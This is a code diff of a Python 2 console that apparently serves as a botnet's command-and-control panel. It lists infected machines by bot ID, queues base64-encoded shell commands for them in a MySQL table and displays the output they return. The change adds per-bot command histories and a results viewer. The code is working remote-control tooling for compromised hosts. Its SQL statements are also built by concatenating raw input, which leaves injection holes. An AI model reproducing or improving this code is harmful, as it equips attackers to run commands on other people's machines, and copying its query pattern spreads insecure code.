@@ -5,49 +5,72 @@ import sys
 import base64
 import ConfigParser
 
-def sendCommand(mID, osT, c, db):
+def sendCommand(botID, osT, c, db):
 	print
-	print "Send the following command to machineID: " + mID
+	print "Send the following command to machineID: " + botID
 	selection = raw_input("$ ")
 	encodedSelection = base64.b64encode(selection)
 	if len(selection) > 1:
-		sql = "INSERT INTO botInfo (machineID, osType, httpCommand, executed) VALUES ('" + mID + "','" + osT + "','" + encodedSelection + "','N')"
+		sql = "INSERT INTO botInfo (machineID, osType, httpCommand, executed) VALUES ('" + botID + "','" + osT + "','" + encodedSelection + "','N')"
 		c.execute(sql)
 		db.commit()
-	main()
+	controlBot(botID, c, db)
+
+def displayResults(actionID, c, db):
+	sql = "SELECT id, machineID, osType, httpCommand, httpResults, executed FROM botInfo WHERE id=" + actionID
+	c.execute(sql)
+	db.commit()
+	if (c.rowcount > 0):
+		for row in c.fetchall():
+			id = actionID
+			botID = row[1]
+			osType = row[2]
+			httpCommand = base64.b64decode(row[3])
+			httpResults = base64.b64decode(row[4])
+			executed = row[5]
+			print
+			print "Action ID: " + id + "  BotID: " + botID + " OS Type: " + osType
+			print
+			if executed == 'Y':
+				print "Command Executed: " + httpCommand
+				print
+				print httpResults
+				print
+			else:
+				print "Command is Pending: " + httpCommand
+				print
+
 
 def controlBot(botID, cur, db):
 	while True:
-		sql = "SELECT machineID, osType, httpCommand, httpResults, executed FROM botInfo WHERE id=" + botID
+		sql = "SELECT id, osType, httpCommand, executed FROM botInfo WHERE machineID='" + botID + "'"
 		cur.execute(sql)
 		db.commit()
 		if (cur.rowcount > 0):
+			print 
+			print "Command History for BotID " + botID
+			print "Select the number preceeding the command to view the results of the command."
+			print
+			idList = []
 			for row in cur.fetchall():
-				id = botID
-				machineID = row[0]
+				id = row[0]
+				idList.append(row[0])
+				machineID = botID
 				osType = row[1]
 				httpCommand = base64.b64decode(row[2])
-				encodedResults = row[3]
-				if encodedResults:
-					httpResults = base64.b64decode(encodedResults)
-				else:
-					httpResults = "Pending..."
 				executed = row[3]
-				print
-				print "BotID: " + id + " MachineID: " + machineID
-				print "Command: " + httpCommand
-				print 
-				print "Results:"
-				print httpResults
-				print
-			print "I. Issue Command to Bot"
+				print str(id) + ": Results Exist: " + executed + " Command: " + httpCommand
+			print
+			print "I. Issue New Command to Bot"
 			print "R. Refresh"
 			print "Q. Return to Main"
-			selection = raw_input(id+"$ ")
+			selection = raw_input("$ ")
 			if (selection == 'I') | (selection == 'i'):
 				sendCommand(machineID, osType, cur, db)
 			elif (selection == 'Q') | (selection == 'q'):
 				main()
+			elif int(selection) in idList:
+				displayResults(selection, cur, db)
 			else:
 				continue
 		else:
@@ -66,21 +89,22 @@ def main():
 	cursor = db.cursor()
 	while True:
 		print 
-		print "Select the number preceding the botID or the following options:"
-		sql = "SELECT id, machineID, httpCommand, executed FROM botInfo"
+		print "Select the number preceding the botID to interact with it:"
+		print
+		sql = "SELECT machineID, id FROM botInfo ORDER BY id DESC"
 		cursor.execute(sql)
 		db.commit()
 		if (cursor.rowcount > 0):
+			botList = []
+			idList = []
+			count = 0
 			for row in cursor.fetchall():
-				id = row[0]
-				machineID = row[1]
-				httpCommand = base64.b64decode(row[2])
-				executed = row[3]
-				if executed == 'Y':
-					httpResultsExist="Y"
-				else:
-					httpResultsExist="N"
-				print str(id) + ". BotID:" + machineID + " Command:" + httpCommand + " Results Exist:" + httpResultsExist
+				if not row[0] in botList:
+					botList.append(row[0])
+					idList.append(count)
+					count += 1
+			for i in range(0, len(idList)):
+				print str(i) + ". BotID:" + str(botList[i])
 		print
 		print "R. Refresh"
 		print "Q. Quit"
@@ -89,8 +113,10 @@ def main():
 			sys.exit(0)
 		elif (selection == 'R') | (selection == 'r'):
 			continue
+		elif int(selection) in idList:
+			controlBot(botList[int(selection)], cursor, db)
 		else:
-			controlBot(selection, cursor, db)
+			continue
 	cursor.close()
 	del cursor
 	db.close()
